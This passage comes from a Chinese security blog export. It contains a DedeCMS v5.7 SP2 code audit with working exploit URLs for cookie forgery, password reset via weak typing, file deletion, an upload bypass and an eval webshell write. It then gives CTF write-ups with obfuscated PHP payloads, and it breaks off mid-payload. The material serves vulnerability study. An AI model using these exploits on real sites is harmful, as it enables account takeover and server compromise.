<p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20121536.png" alt="屏幕截图 2021-03-13 121536"></p>
<ul>
<li><p>漏洞复现</p>
<p> 情况一：</p>
<p> 由于mid在数据库中是int，所以要进行cookie的伪造需要注册用户名为要越权的用户mid数值，而admin默认为1。因此可以直接登录为admin。</p>
<p> 需要注册用户名为对应数据库中dede_member表中mid对应的值。如注册用户名为0001对应dede_member表中mid为1，便是admin的mid。</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20123051.png" alt="屏幕截图 2021-03-13 123051"></p>
</li>
</ul>
<p>然后访问<code>/member/index.php?uid=0001</code>获取伪造的cookie</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20130027.png" alt="屏幕截图 2021-03-13 130027"></p>
<p>最后访问<code>/member/index.php</code>并带上cookie即可</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20130235.png" alt="屏幕截图 2021-03-13 130235"></p>
<p>​    情况二：</p>
<p>​    在<code>member/index.php</code>文件第124行，当uid不为空时会<code>require_once(DEDEMEMBER.&#39;/inc/config_space.php&#39;)</code></p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313131650792.png" alt="image-20210313131650792"></p>
<p>​    跟进<code>member/inc/config_space.php</code>在第29行调用了GetUserSpaceInfos方法</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313131855022.png" alt="image-20210313131855022"></p>
<p>​    跟进GetUserSpaceInfos方法，其SQL查询语句使用了<code>like</code>获取数据，通过构造特殊的用户名即可让其下发伪造cookie</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20131954.png" alt="屏幕截图 2021-03-13 131954"></p>
<p>这里我们假设要登录mid为5的用户</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132505860.png" alt="image-20210313132505860"></p>
<p>我们先注册类似于<code>xx5xx</code>的用户</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132632833.png" alt="image-20210313132632833"></p>
<p>然后访问<code>/member/index.php?uid=%5%</code>获取伪造cookie</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20132811.png" alt="屏幕截图 2021-03-13 132811"></p>
<p>加上cookie访问<code>/member/index.php</code></p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132944373.png" alt="image-20210313132944373"></p>
<h3 id="任意修改前台用户密码"><a href="#任意修改前台用户密码" class="headerlink" title="任意修改前台用户密码"></a><strong>任意修改前台用户密码</strong></h3><ul>
<li><p>漏洞分析</p>
<p>在<code>member/resetpassword.php</code>75-99行，进行安全问题的判断。默认<code>$row[&#39;safequestion&#39;]</code>在数据库的内容为<code>&#39;0&#39;</code>，<code>$row[&#39;safeanswer&#39;]</code>在数据库中的结果为<code>&#39;&#39;</code>，且变量<code>$safeanswer</code>与<code>$safequestion</code>是用户可控制的变量，又使用了 ==进行判断， 因此该判断规则存在弱类型问题。如果用户在注册时设置了密保问题则没有这个问题</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20151940.png" alt="屏幕截图 2021-03-13 151940"></p>
<p>这里打印下$row</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20153731.png" alt></p>
<p>对于<code>$safeanswer</code>我们不传值，经过85行处理也会为空，从而相等。</p>
<p>对于<code>$safequestion</code>我们需要传一个值使其绕过<code>empyt()</code>且等于<code>‘0’</code>。</p>
<p>根据手册，我们可以构造出 </p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0.0</span>(作为字符串)</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0e0</span></span><br><span class="line"><span class="number">0e1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313155728546.png" alt="image-20210313155728546"></p>
</li>
</ul>
<ul>
<li><p>漏洞复现</p>
<p>先进行如下请求获取key</p>
<p><code>/member/resetpassword.php?dopost=safequestion&amp;safequestion=0x0&amp;safeanswer=&amp;id=2</code> </p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20160236.png" alt="屏幕截图 2021-03-13 160236"></p>
</li>
</ul>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313160537171.png" alt="image-20210313160537171"></p>
<h3 id="任意重置后台用户密码"><a href="#任意重置后台用户密码" class="headerlink" title="任意重置后台用户密码"></a><strong>任意重置后台用户密码</strong></h3><ul>
<li><p>漏洞分析</p>
<p>在<code>member/edit_baseinfo.php</code> 118-123行修改前端密码同时也会修改后端密码</p>
</li>
</ul>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313161155719.png" alt="image-20210313161155719"></p>
<h3 id="前台任意文件删除"><a href="#前台任意文件删除" class="headerlink" title="前台任意文件删除"></a><strong>前台任意文件删除</strong></h3><ul>
<li><p>漏洞分析</p>
<p>问题出在<code>member/inc/inc_batchup.php</code>的<code>DelArc</code>方法，对于<code>$licp[&#39;litpic&#39;]</code>直接拼接在目录后面只检测文件存不存在，没有检查文件类型就直接删除。重点在于这个<code>litpic</code>我们是否可控</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313204533734.png" alt="image-20210313204533734"></p>
<p>接着全局搜索了<code>litpic</code>变量，发现<code>member/inc/archives_check_edit.php</code>发现79-93行可以通过控制<code>$oldlitpic</code>来<code>litpic</code>。在<code>$litpic</code>为空的情况下，<code>$litpic=$oldlitpic</code>。</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314155059165.png" alt="image-20210314155059165"></p>
<p>接着全局搜索<code>archives_check_edit</code></p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314152654346.png" alt="image-20210314152654346"></p>
<p>也就是这四个功能受影响</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20155544.png" alt="屏幕截图 2021-03-14 155544"></p>
<p>而在上传图集的功能里，同样可控<code>litpic</code> 在<code>member/album_add.php</code> 88-103行，在<code>$formhtml==1 &amp;&amp; $ddisfirst==1 &amp;&amp; $litpic==&#39;&#39; &amp;&amp; !empty($litpicname)</code>下<code>$litpic==$litpicname</code></p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20160450.png" alt="屏幕截图 2021-03-14 160450"></p>
<p><code>$formhtml</code>可传参控制，<code>$ddisfirst</code>默认为1,至于<code>$litpic</code>我们跟进<code>archives_check.php</code>，在100-102行</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314161257476.png" alt="image-20210314161257476"></p>
<p>跟进<code>MemberUploads</code>方法，在<code>include/helpers/upload.helper.php</code> 118-240行，其中215-222行是关键在不上传缩略图的情况下会进入else分支，同时<code>MemberUploads</code>的<code>handname</code>参数默认为空。即返回值也为空。所以<code>$litpic</code>可控</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314161619071.png" alt="image-20210314161619071"></p>
<p>最后全局搜索<code>DelArc</code>函数查找触发点，在<code>member/archives_do.php</code>，有个<code>issystem</code>的判断</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314162605298.png" alt="image-20210314162605298"></p>
<p>数据库查询一下，默认情况下出了<code>infos</code>其他都会调用<code>DelArc</code>删除文件。</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314162729095.png" alt="image-20210314162729095"></p>
</li>
<li><p>漏洞复现</p>
<p>情况一：</p>
<p>以文章为例 </p>
<p>先发表文章，内容随意填</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314164413817.png" alt="image-20210314164413817"></p>
<p>再修改文章同时加上<code>oldlitpic</code>的值</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20164614.png" alt="屏幕截图 2021-03-14 164614"></p>
<p>数据库：</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314164927927.png" alt="image-20210314164927927"></p>
<p>最后删除文章即可删除<code>oldlitpic</code>指向的文件。</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20165328.png" alt="屏幕截图 2021-03-14 165328"></p>
<p>情况二：</p>
<p>上传图集时添加<code>formhtml</code>和<code>litpicname</code>即可</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314165944131.png" alt="image-20210314165944131"></p>
<p>删除图集</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314170320939.png" alt="image-20210314170320939"></p>
</li>
</ul>
<h3 id="前台任意文件上传"><a href="#前台任意文件上传" class="headerlink" title="前台任意文件上传"></a><strong>前台任意文件上传</strong></h3><ul>
<li><p>漏洞分析</p>
<p>上传需要admin权限，有点鸡肋。但配合之前的cookie伪造也还行。</p>
<p>问题在<code>include/dialog/select_images_post.php</code>对于后缀的处理逻辑有问题。在36行获取文件名,然后过滤。</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210316211925145.png" alt="image-20210316211925145"></p>
<p>这个文件名就是我们上传的文件名，具体的调用是</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">select_images_post</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">config</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">common</span><span class="selector-class">.inc</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt;  <span class="selector-tag">uploadsafe</span><span class="selector-class">.inc</span><span class="selector-class">.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20212521.png" alt="屏幕截图 2021-03-16 212521"></p>
<p>接着在58到64行进行后缀拼接和上传。直接通过<code>.</code>来分割文件名，将最后一个后缀作为文件后缀。</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20212843.png" alt="屏幕截图 2021-03-16 212843"></p>
<p>通过构造类似</p>
<figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line">p<span class="comment">%hp</span></span><br><span class="line">p*hp</span><br><span class="line">p&lt;hp</span><br><span class="line">p?hp</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>即可绕过上传。</p>
</li>
<li><p>漏洞利用</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20213715.png" alt="屏幕截图 2021-03-16 213715"></p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20215140.png" alt="屏幕截图 2021-03-16 215140"></p>
</li>
</ul>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210316215503126.png" alt="image-20210316215503126"></p>
<h3 id="后台文件写入"><a href="#后台文件写入" class="headerlink" title="后台文件写入"></a>后台文件写入</h3><ul>
<li><p>漏洞分析</p>
<p>又是需要后台admin权限，太鸡肋了。DedeCMS后台本来就带有文件管理器，本着学习的态度就记录一下。</p>
<p>问题出在<code>dede/sys_verifies.php</code>，<code>fwrite</code>的参数未经过过滤，导致文件写入，配合<code>require_once</code>getshell</p>
</li>
</ul>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20190619.png" alt="屏幕截图 2021-03-17 190619"></p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20191424.png" alt="屏幕截图 2021-03-17 191424"></p>
<ul>
<li><p>漏洞复现</p>
<p>访问<code>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\&quot;;eval($_GET[a]);die();//</code> 写入文件</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317191752815.png" alt="image-20210317191752815"></p>
<p>访问<code>/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code>执行命令</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317191855712.png" alt="image-20210317191855712"></p>
</li>
</ul>
<h3 id="后台二次注入getshell"><a href="#后台二次注入getshell" class="headerlink" title="后台二次注入getshell"></a>后台二次注入getshell</h3><ul>
<li><p>漏洞分析</p>
<p>在<code>dede/ad_add.php</code>80-83行，参数<code>$normbody</code>未经过滤就放入数据库中</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20193957.png" alt="屏幕截图 2021-03-17 193957"></p>
<p>而在<code>plus/ad_js.php</code> 21-44行，查询结果直接包含。</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20194249.png" alt="屏幕截图 2021-03-17 194249"></p>
</li>
<li><p>复现漏洞</p>
<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317194532192.png" alt="image-20210317194532192"></p>
</li>
</ul>
<p>  <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317194553335.png" alt="image-20210317194553335"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/column/161703.html" target="_blank" rel="noopener">https://www.freebuf.com/column/161703.html</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/12741373.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpchcbd/p/12741373.html</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>6月刷题记录</title>
    <url>/2020/06/6%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-某师傅出的招新题"><a href="#1-某师傅出的招新题" class="headerlink" title="1.某师傅出的招新题"></a>1.某师傅出的招新题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">Flag in flag.php</span></span><br><span class="line"><span class="comment">You can use "readfile" function.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">$rce = <span class="keyword">new</span> $str2(<span class="string">'TestClass'</span>);</span><br><span class="line">$a = $rce-&gt;$str1();</span><br><span class="line">$st1 = $_POST[<span class="string">'st1'</span>];</span><br><span class="line">$st2 = $_POST[<span class="string">'st2'</span>];</span><br><span class="line"><span class="keyword">if</span>($st1==<span class="keyword">null</span>&amp;&amp;$st2==<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"GET!!!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $z = substr($a,$st1,<span class="number">8</span>);</span><br><span class="line">    $x = substr($a,$st2,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">echo</span> $z.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $x.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    $z($x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>

<p>开始看题的时候很懵，没见过。后面看队友说用反射类做。就在网上找了下这方面的<a href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/" target="_blank" rel="noopener">CTF题</a>发现这道题 </p>
<p><code>$a=$rce-&gt;$str1()</code>并不能传参，而且还有些疑惑，干嘛定义个空类 <code>Testcalss</code> 毫无头绪</p>
<p>然后去看了下<a href="https://www.php.net/manual/zh/class.reflectionclass.php" target="_blank" rel="noopener">php手册</a>找无参的函数，突然 发现<a href="https://www.php.net/manual/zh/reflectionclass.getdoccomment.php" target="_blank" rel="noopener">ReflectionClass::getDocComment()</a> — 获取文档注释</p>
<p>这个函数有搞头 ，利用注释中的 <code>flag.php</code> ，<code>readfile</code> 和<code>$z($x)</code>不就可以读取文件了吗</p>
<p><img src="/2020/06/6月刷题记录/image-20200602005512196.png" alt="image-20200602005512196"></p>
<p>这个题目出的很巧妙。orz</p>
<h3 id="2-RoarCTF-2019-Easy-Calc"><a href="#2-RoarCTF-2019-Easy-Calc" class="headerlink" title="2.[RoarCTF 2019]Easy Calc"></a>2.[RoarCTF 2019]Easy Calc</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> <code>$blacklist</code>中过滤了 <code>^</code> 同时题目设置了WAF，过滤了<code>字母、#、！</code>，所以取反也不能用。</p>
<p>不过可以使用按位与<code>&amp;</code>以及按位或<code>|</code>。在 PHP 中，将两个数字使用<code>.</code>拼接，会当做字符串来处理，返回的也是一个字符串。例如：<code>(1).(2)</code>出来的就是字符串<code>&quot;12&quot;</code>，然后可以用<code>{}</code>来代替<code>[]</code>来取单个字符。<br> 并且，PHP 中，<code>1/0</code>得出的是<code>float</code>类型的<code>INF</code>，<code>0/0</code>得出的是<code>float</code>类型的<code>NAN</code>，我们也可以把这些转成字符串类型，从而得到字母<code>A</code> <code>I</code> <code>N</code> <code>F</code>。</p>
<p>E99p1ant师傅的<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">Fuzz 脚本</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后根据这个表，就可以构造代码了。可以构造形如<code>(phpinfo)()</code>这样的形式，来动态执行函数。<br> 值得一提的是，PHP 中函数名是不区分大小写的，因此不一定需要全小写的字符拼凑函数名。<br> <code>phpinfo()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))()</span><br></pre></td></tr></table></figure>

<p><code>(scandir)(../../../)</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))((((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span 